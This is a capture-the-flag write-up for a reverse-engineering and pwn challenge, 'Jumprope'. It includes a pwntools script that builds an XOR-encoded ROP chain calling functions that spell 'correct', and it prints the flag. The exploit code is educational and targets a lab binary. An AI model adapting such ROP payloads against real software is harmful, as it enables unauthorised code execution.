# Jumprope

We are given a `ELF` file.

By putting that file in ghidra.

We can see there are `c , o , r , e , t` functions

The function will form word `correct`

If we make these functions `c , o , r , r , e , c , t`.

It is more of PWN. using the script we can get the flag.

```py
from pwn import *
import sys

l = [133, 77, 240, 104, 13, 145, 123, 49, 203, 56, 213, 149, 244, 231, 219, 129, 194, 38, 120, 180, 134, 200, 189, 152, 101, 156, 234, 74, 250, 243, 237, 64, 97, 19, 60, 90, 67, 228, 94, 204, 50, 78, 117, 37, 253, 249, 118, 160, 176, 9, 30, 173, 33, 114, 47, 102, 25, 167, 186, 146, 254, 124, 59, 80, 216, 4, 143, 214, 16, 185, 23, 179, 140, 83, 93, 73, 127, 190, 29, 40, 108, 130, 71, 107, 136, 220, 139, 89]
buf = [0xfd, 0x3c, 0xc4, 0xe, 0x76, 0xff, 0x4b, 0x45, 0x1f, 0x40, 0xf4, 0xe6, 0x80, 0xb8, 0xb5, 0xe8, 0x76, 0x8e, 0x3b, 0xf8, 0xe4, 0xbd, 0xc9, 0xc7, 0x3f, 0xe6, 0xcf, 0x15, 0x94, 0x9a, 0x8a, 0x28, 0x4e, 0x5e, 0x1e, 0x3f, 0x25, 0xd4, 0x2c, 0xa9, 0x36, 0x28, 0x42, 0x40, 0x93, 0x8d, 0xf, 0xff, 0xae, 0x2b, 0x2b, 0xdf, 0x7e, 0x1a, 0x4e, 0x5, 0x63, 0xd0, 0x88, 0xe1, 0xa1, 0x1f, 0x5a, 0x3d, 0x36, 0x4f, 0xae, 0x89, 0x7b, 0xd7, 0x27, 0xd0, 0x29, 0xc0, 0x9e, 0xf0, 0x20, 0xdf, 0x69, 0x77, 0x94, 0xe9, 0x58, 0xf, 0xb8, 0xec, 0xf9, 0x24]

c = 0x401211
o = 0x40122E
r = 0x40125B
e = 0x401278
t = 0x401295
pop_rdi = 0x000000000040148b #: pop rdi; ret; 

p = (c).to_bytes(8, byteorder='little')
p += (pop_rdi).to_bytes(8, byteorder='little')
p += (0x1337C0D3).to_bytes(8, byteorder='little')
p += (o).to_bytes(8, byteorder='little')
p += (r).to_bytes(8, byteorder='little')
p += (r).to_bytes(8, byteorder='little')
p += (e).to_bytes(8, byteorder='little')
p += (c).to_bytes(8, byteorder='little')
p += (pop_rdi).to_bytes(8, byteorder='little')
p += (0xDEADFACE).to_bytes(8, byteorder='little')
p += (t).to_bytes(8, byteorder='little')

x = []
for i in range(len(p)):
    x.append(p[i] ^ (buf[i] ^ l[i]))
sys.stdout.buffer.write(bytes(x))
```

FLAG:- ``ictf{n0t_last_night_but_the_night_bef0re_twenty_f0ur_hackers_came_a_kn0cking_at_my_d00r}``
